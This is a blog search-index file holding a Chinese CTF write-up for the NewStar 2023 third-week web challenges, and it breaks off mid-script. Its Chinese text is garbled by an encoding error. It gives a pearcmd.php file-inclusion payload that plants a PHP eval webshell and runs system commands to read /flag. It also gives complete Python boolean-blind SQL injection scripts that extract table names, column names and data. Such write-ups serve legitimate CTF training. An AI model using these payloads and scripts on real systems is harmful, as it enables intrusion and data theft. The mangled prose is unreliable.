<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Newstaræ–°ç”Ÿèµ›2023ç¬¬ä¸‰å‘¨WP</title>
    <link href="/2023/11/03/2023-11-3-newstarweek3/"/>
    <url>/2023/11/03/2023-11-3-newstarweek3/</url>
    
    <content type="html"><![CDATA[<h1 id="Newstaræ–°ç”Ÿèµ›2023ç¬¬ä¸‰å‘¨WP"><a href="#Newstaræ–°ç”Ÿèµ›2023ç¬¬ä¸‰å‘¨WP" class="headerlink" title="Newstaræ–°ç”Ÿèµ›2023ç¬¬ä¸‰å‘¨WP"></a>Newstaræ–°ç”Ÿèµ›2023ç¬¬ä¸‰å‘¨WP</h1><h2 id="Include-ğŸ"><a href="#Include-ğŸ" class="headerlink" title="Include ğŸ"></a>Include ğŸ</h2><p>ä»£ç å®¡è®¡:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <span class="hljs-comment">//å°†æ–‡ä»¶åŒ…å«æ¼æ´çš„ä¼ªåè®®banæ‰äº†</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="hljs-variable">$file</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>        &#125;<br>        <span class="hljs-comment">//æç¤ºphpinfo.phpæ–‡ä»¶</span><br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>        <span class="hljs-comment"># Something in phpinfo.php!</span><br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>è®¿é—®phpinfo.php,å¹¶åœ¨å“åº”å†…å®¹ä¸­å¯»æ‰¾flagï¼š<br><img src="/images/2023-11-3-newstar-3/image-20231009114740035.png" alt="image-20231009114740035"></p><p>å¯»æ‰¾ä¸€ä¸‹register_argc_argvï¼š</p><p><img src="/images/2023-11-3-newstar-3/image-20231009114850048.png" alt="image-20231009114850048"></p><p>å‘ç°register_argc_argvå¤„äºå¼€å¯çŠ¶æ€,æ‰€ä»¥å¯ä»¥[åˆ©ç”¨pearcmd.phpæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆLFI):<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);?&gt;+/tmp/test.php<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨bpä¸Šä¼ payload,ç›´æ¥ç”¨æµè§ˆå™¨ä¸Šä¼ ä¼šå¯¼è‡´æˆ‘ä»¬ä¼ å…¥çš„å†…å®¹è¢«urlç¼–ç åŒ–ï¼Œå¯¼è‡´phpè¯­è¨€å˜å½¢</p><p><img src="/images/2023-11-3-newstar-3/image-20231009115202206.png" alt="image-20231009115202206"></p><p>æˆ‘ä»¬çš„æ–‡ä»¶è¢«æˆåŠŸåˆ›å»ºåœ¨&#x2F;tmpç›®å½•ä¸‹,ä¸ºtest.php</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">?file=/tmp/test.php<br>=&gt;ç”±äºåé¢å®ƒç»™æˆ‘ä»¬è‡ªåŠ¨åŠ ä¸Šphp,æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦ä¼ å…¥æ–‡ä»¶åå³å¯<br>?file=/tmp/test<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231009115338558.png" alt="image-20231009115338558"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>cmd=system(&quot;ls /&quot;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231009115429049.png" alt="image-20231009115429049"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>cmd=system(&quot;cat /flag&quot;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231009115526916.png" alt="image-20231009115526916"></p><h2 id="medium-sql"><a href="#medium-sql" class="headerlink" title="medium_sql"></a>medium_sql</h2><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=TMP0919&#x27; GROUP BY 5 -- &#x27;<br></code></pre></td></tr></table></figure><p>å¾—åˆ°å­—æ®µæ•°é‡ä¸º5</p><p>ä½¿ç”¨ç›²æ³¨ï¼š<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=TMP0919&#x27;anD(1=1) -- &#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010205748567.png" alt="image-20231010205748567"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=TMP0919&#x27;anD(1=2) -- &#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010215505760.png" alt="image-20231010215505760"></p><p>å­˜åœ¨sqlæ³¨å…¥ç›²æ³¨ç‚¹</p><p>çˆ†è¡¨:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># urlæ˜¯éšæ—¶æ›´æ–°çš„ï¼Œå…·ä½“çš„ä»¥åšé¢˜æ—¶å€™çš„ä¸ºå‡†</span><br><br><span class="hljs-comment"># ç™»å½•dvwaçš„header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># å½“å‰æ³¨å…¥ç‚¹çš„urlä¼ è¾“æ ¼å¼:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase()+limit+0%2C1)%2C1%2C1))&gt;102+%23&amp;Submit=Submit#</span><br><br>url = <span class="hljs-string">&#x27;http://29b31bd5-9259-4782-a9da-e797bb66785d.node4.buuoj.cn:81/?id=&#x27;</span><br><span class="hljs-comment"># table_lenå­˜å‚¨æ¯å¼ è¡¨çš„é•¿åº¦</span><br>table_len = [<span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>]<br><span class="hljs-comment"># table_nameå­˜å‚¨æ¯å¼ è¡¨çš„åå­—</span><br>table_name = []<br><span class="hljs-comment"># indexå­˜å‚¨ç°åœ¨å¤„ç†çš„æ˜¯ç¬¬index+1å¼ è¡¨</span><br>index = <span class="hljs-number">0</span><br><span class="hljs-comment"># ç”±äºè·å–çš„æ˜¯æ‰€æœ‰è¡¨åæ€»å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥åªè¦éå†ä¸€æ¬¡å³å¯</span><br><span class="hljs-keyword">while</span> (index &lt; <span class="hljs-number">1</span>):<br>    name = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-comment"># nè¡¨ç¤ºå½“å‰å¤„ç†çš„è¡¨æ‰€å¤„ç†çš„æ˜¯ç¬¬nä¸ªå­—ç¬¦</span><br>    n = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> (n &lt;= table_len[index]):<br>        <span class="hljs-comment"># ä»å¯æ‰“å°å­—ç¬¦å¼€å§‹</span><br>        begin = <span class="hljs-number">32</span><br>        end = <span class="hljs-number">126</span><br>        tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># å¯¹ç¬¬nä¸ªå­—ç¬¦è¿›è¡Œåˆ¤æ–­</span><br>        <span class="hljs-keyword">while</span> (begin &lt; end):<br>            <span class="hljs-comment"># æ ¹æ®å½“å‰ç½‘é¡µurlä¼ è¾“æ ¼å¼æ„é€ payload</span><br>            <span class="hljs-comment"># payload1:ç”¨äºæ™®é€šç›²æ³¨</span><br>            <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase()+limit+&#123;&#125;%2C1)%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(index, n, tmp)</span><br>            payload2 = <span class="hljs-string">&quot;TMP0919&#x27;anD(asCii(suBstr((sElect(GROUP_CONCAT(TABLE_NAME))frOm(infOrmation_schema.tables)wHere(TABLE_SCHEMA=database())),&#123;&#125;,1))&gt;&#123;&#125;) -- &#x27;&quot;</span>.<span class="hljs-built_in">format</span>(n, tmp)<br>            <span class="hljs-comment"># æ„é€ urlè¯·æ±‚,å¹¶å­˜å‚¨è¿”å›çš„ç½‘é¡µå“åº”ç»“æœ</span><br>            <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # ç”¨äºè¡¥å…¨ç½‘é¡µçš„url</span><br>            <span class="hljs-comment"># print(url + payload2)</span><br>            <span class="hljs-comment"># print()</span><br>            r = requests.get(url + payload2)<br>            time.sleep(<span class="hljs-number">0.05</span>)<br>            <span class="hljs-comment"># åˆ¤æ–­è¯¥payloadæ‰€è¿”å›çš„ç½‘é¡µæ˜¯trueç•Œé¢è¿˜æ˜¯falseç•Œé¢</span><br>            true_text = <span class="hljs-string">&quot;Physics&quot;</span><br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>                <span class="hljs-comment"># è¿”å›trueç•Œé¢ </span><br>                begin = tmp + <span class="hljs-number">1</span><br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># è¿”å›flaseç•Œé¢</span><br>                end = tmp<br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># æœ€ç»ˆbegin==end,è€Œæ­¤æ—¶çš„tmpå°±æ˜¯è¯¥å­—ç¬¦çš„asciiç </span><br>        name = name + <span class="hljs-built_in">chr</span>(tmp)<br>        <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€ä¸ªå­—ç¬¦</span><br>        n = n + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># å­˜å‚¨è¯¥è¡¨çš„è¡¨å</span><br>    table_name.append(name)<br>    <span class="hljs-comment"># æ‰“å°è¯¥è¡¨çš„è¡¨å</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ç¬¬&#123;&#125;å¼ è¡¨çš„åå­—ä¸º&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(index+<span class="hljs-number">1</span>, name))<br>    <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€ä¸ªè¡¨</span><br>    index = index + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(table_name)<br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">ç¬¬1å¼ è¡¨çš„åå­—ä¸ºgrades,here_is_flag<br>[&#x27;grades,here_is_flag           &#x27;]<br></code></pre></td></tr></table></figure><p>çˆ†è¡¨çš„å­—æ®µ:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># urlæ˜¯éšæ—¶æ›´æ–°çš„ï¼Œå…·ä½“çš„ä»¥åšé¢˜æ—¶å€™çš„ä¸ºå‡†</span><br><br><span class="hljs-comment"># ç™»å½•dvwaçš„header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># å½“å‰æ³¨å…¥ç‚¹çš„urlä¼ è¾“æ ¼å¼:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name%3D+&#x27;users&#x27;+limit+0%2C1)%2C1%2C1))%3D117+%23</span><br><br>url = <span class="hljs-string">&#x27;http://29b31bd5-9259-4782-a9da-e797bb66785d.node4.buuoj.cn:81/?id=&#x27;</span><br><br><span class="hljs-comment"># table_col_numå­˜å‚¨æ¯å¼ è¡¨æ¯ä¸ªå­—æ®µæ‰€å¯¹åº”çš„é•¿åº¦</span><br>table_col_num = &#123;<span class="hljs-string">&#x27;here_is_flagç¬¬1å­—æ®µçš„é•¿åº¦&#x27;</span>: <span class="hljs-number">50</span>&#125;<br><span class="hljs-comment"># table_nameå­˜å‚¨æ¯å¼ è¡¨çš„åå­—</span><br>table_name = [<span class="hljs-string">&#x27;here_is_flag&#x27;</span>]<br><span class="hljs-comment"># col_countå­˜å‚¨æ¯å¼ è¡¨çš„å­—æ®µæ•°</span><br><span class="hljs-comment"># å°†æ‰€æœ‰å­—æ®µåˆåœ¨ä¸€èµ·è¾“å‡ºå°±æ˜¯åªæœ‰ä¸€ä¸ªå­—æ®µ</span><br>col_count = &#123;<span class="hljs-string">&#x27;here_is_flag&#x27;</span>: <span class="hljs-number">1</span>&#125;<br><span class="hljs-comment"># table_col_nameå­˜å‚¨æ¯å¼ è¡¨çš„å­—æ®µçš„åå­—</span><br>table_col_name = &#123;&#125;<br><br>table_num = <span class="hljs-built_in">len</span>(table_name)<br>table_index = <span class="hljs-number">0</span><br><span class="hljs-comment"># å…ˆå¯¹è¡¨è¿›è¡Œéå†,åªæœ‰è¡¨F1naI1y</span><br><span class="hljs-keyword">while</span> (table_index &lt; <span class="hljs-number">1</span>):<br>    <span class="hljs-comment"># å½“å‰è¡¨çš„åå­—:table_name[table_index]</span><br>    <span class="hljs-comment"># col_numå­˜å‚¨å½“å‰è¡¨çš„å­—æ®µæ•°</span><br>    col_num = col_count[table_name[table_index]]<br>    col_index = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># å¯¹å½“å‰è¡¨çš„å­—æ®µè¿›è¡Œéå†ï¼Œè·å–å…¨éƒ¨å­—æ®µåï¼Œæ‰€ä»¥åªæœ‰ä¸€ä¸ªå­—æ®µ</span><br>    <span class="hljs-keyword">while</span> (col_index &lt; <span class="hljs-number">1</span>):<br>        <span class="hljs-comment"># table_col_keyå­˜å‚¨å½“å‰è¡¨å½“å‰å­—æ®µçš„key</span><br>        key = <span class="hljs-string">&quot;&#123;&#125;ç¬¬&#123;&#125;å­—æ®µçš„é•¿åº¦&quot;</span>.<span class="hljs-built_in">format</span>(table_name[table_index], col_index+<span class="hljs-number">1</span>)<br>        <span class="hljs-comment"># col_lenå­˜å‚¨å½“å‰å­—æ®µçš„é•¿åº¦</span><br>        col_len = table_col_num[key]<br>        <span class="hljs-comment"># éå†å½“å‰å­—æ®µ</span><br>        col_len_index = <span class="hljs-number">0</span><br>        <span class="hljs-comment"># nameå­˜å‚¨å½“å‰å­—æ®µçš„åç§°</span><br>        name = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">while</span> (col_len_index &lt; col_len):<br>            <span class="hljs-comment"># ç”¨äºŒåˆ†æ³•å¯¹å½“å‰å­—æ®µè¿›è¡ŒçŒœè§£</span><br>            <span class="hljs-comment"># ä»å¯æ‰“å°å­—ç¬¦å¼€å§‹</span><br>            begin = <span class="hljs-number">32</span><br>            end = <span class="hljs-number">126</span><br>            tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-comment"># å¯¹ç¬¬nä¸ªå­—ç¬¦è¿›è¡Œåˆ¤æ–­</span><br>            <span class="hljs-keyword">while</span> (begin &lt; end):<br>                <span class="hljs-comment"># æ ¹æ®å½“å‰ç½‘é¡µurlä¼ è¾“æ ¼å¼æ„é€ payload</span><br>                <span class="hljs-comment"># payload1:ç”¨äºæ™®é€šç›²æ³¨</span><br>                <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name%3D+&#x27;&#123;&#125;&#x27;+limit+&#123;&#125;%2C1)%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(table_name[table_index], col_index, col_len_index+1, tmp)</span><br>                payload2 = <span class="hljs-string">&quot;TMP0919&#x27;anD(asCii(suBstr((selEct(GROUP_CONCAT(COLUMN_NAME))frOm(infOrmation_schema.COLUMNS)wHere(TABLE_NAME=&#x27;here_is_flag&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;) -- &#x27;&quot;</span>.<span class="hljs-built_in">format</span>(col_len_index+<span class="hljs-number">1</span>, tmp)<br>                <span class="hljs-comment"># print(table_name[table_index], col_index, col_len_index, tmp)</span><br>                <span class="hljs-comment"># æ„é€ urlè¯·æ±‚,å¹¶å­˜å‚¨è¿”å›çš„ç½‘é¡µå“åº”ç»“æœ</span><br>                <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # ç”¨äºè¡¥å…¨ç½‘é¡µçš„url</span><br>                <span class="hljs-comment"># print(url + payload1 + str)</span><br>                r = requests.get(url + payload2)<br>                time.sleep(<span class="hljs-number">0.05</span>)<br>                <span class="hljs-comment"># åˆ¤æ–­è¯¥payloadæ‰€è¿”å›çš„ç½‘é¡µæ˜¯trueç•Œé¢è¿˜æ˜¯falseç•Œé¢</span><br>                true_text = <span class="hljs-string">&quot;Physics&quot;</span><br>                <span class="hljs-comment"># print(r.text)</span><br>                <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>                    <span class="hljs-comment"># è¿”å›trueç•Œé¢ </span><br>                    <span class="hljs-comment"># print(&quot;true&quot;)</span><br>                    begin = tmp + <span class="hljs-number">1</span><br>                    tmp = (begin + end) // <span class="hljs-number">2</span><br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-comment"># è¿”å›flaseç•Œé¢</span><br>                    end = tmp<br>                    tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-comment"># æœ€ç»ˆbegin==end,è€Œæ­¤æ—¶çš„tmpå°±æ˜¯è¯¥å­—ç¬¦çš„asciiç </span><br>            <span class="hljs-comment"># print(tmp)</span><br>            name = name + <span class="hljs-built_in">chr</span>(tmp)<br>            <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€ä¸ªå­—ç¬¦</span><br>            col_len_index = col_len_index + <span class="hljs-number">1</span><br>        <span class="hljs-comment"># å­˜å‚¨å½“å‰å­—æ®µçš„åç§°:</span><br>        key_name = <span class="hljs-string">&quot;&#123;&#125;çš„ç¬¬&#123;&#125;ä¸ªå­—æ®µçš„åå­—&quot;</span>.<span class="hljs-built_in">format</span>(table_name[table_index], col_index+<span class="hljs-number">1</span>)<br>        table_col_name[key_name] = name<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(key_name, name))<br>        <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€ä¸ªå­—æ®µ</span><br>        col_index = col_index + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€å¼ è¡¨</span><br>    table_index = table_index + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(table_col_name)<br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">here_is_flagçš„ç¬¬1ä¸ªå­—æ®µçš„åå­—:flag<br>&#123;&#x27;here_is_flagçš„ç¬¬1ä¸ªå­—æ®µçš„åå­—&#x27;: &#x27;flag                                              &#x27;&#125;<br></code></pre></td></tr></table></figure><p>çˆ†å­—æ®µçš„å€¼:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># urlæ˜¯éšæ—¶æ›´æ–°çš„ï¼Œå…·ä½“çš„ä»¥åšé¢˜æ—¶å€™çš„ä¸ºå‡†</span><br><br><span class="hljs-comment"># ç™»å½•dvwaçš„header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># å½“å‰æ³¨å…¥ç‚¹çš„urlä¼ è¾“æ ¼å¼:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+user+from+dvwa.users+limit+0%2C1)%2C1%2C1))%3D110+%23</span><br><br>url = <span class="hljs-string">&#x27;http://29b31bd5-9259-4782-a9da-e797bb66785d.node4.buuoj.cn:81/?id=&#x27;</span><br><br><span class="hljs-comment"># database_nameå­˜å‚¨æ•°æ®åº“åå­—</span><br>database_name = <span class="hljs-string">&quot;ctf&quot;</span><br><span class="hljs-comment"># table_nameå­˜å‚¨æŒ‡å®šè¡¨çš„åå­—</span><br>table_name = <span class="hljs-string">&quot;here_is_flag&quot;</span><br><span class="hljs-comment"># col_nameå­˜å‚¨æŒ‡å®šå­—æ®µçš„åå­—</span><br>col_name = <span class="hljs-string">&quot;flag&quot;</span><br><span class="hljs-comment"># col_data_numå­˜å‚¨æœ‰å¤šå°‘åˆ—</span><br><span class="hljs-comment"># æ‰‹åŠ¨æŒ‡å®šè¦æŸ¥çœ‹å¤šå°‘åˆ—æ•°æ®ï¼Œç”±äºåˆåœ¨ä¸€èµ·æ˜¾ç¤ºæ‰€ä»¥åªæœ‰ä¸€åˆ—</span><br>col_data_num = <span class="hljs-number">1</span><br><span class="hljs-comment"># col_data_charnumå­˜å‚¨æ¯ä¸ªå­—æ®µæ•°æ®çš„å­—ç¬¦ä¸ªæ•°</span><br><span class="hljs-comment"># æ‰‹åŠ¨æŒ‡å®šè¦æŸ¥çœ‹å¤šå°‘å­—ç¬¦æ•°æ®</span><br>col_data_charnum = <span class="hljs-number">50</span><br><br>rank_index = <span class="hljs-number">0</span><br><span class="hljs-comment"># å…ˆéå†è¯¥å­—æ®µæœ‰å¤šå°‘åˆ—</span><br><span class="hljs-keyword">while</span> (rank_index &lt; col_data_num):<br>    rank_data_index = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># dataç”¨æ¥å­—æ®µè¯¥åˆ—çš„æ•°æ®</span><br>    data = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">while</span> (rank_data_index &lt; col_data_charnum):<br>        <span class="hljs-comment"># 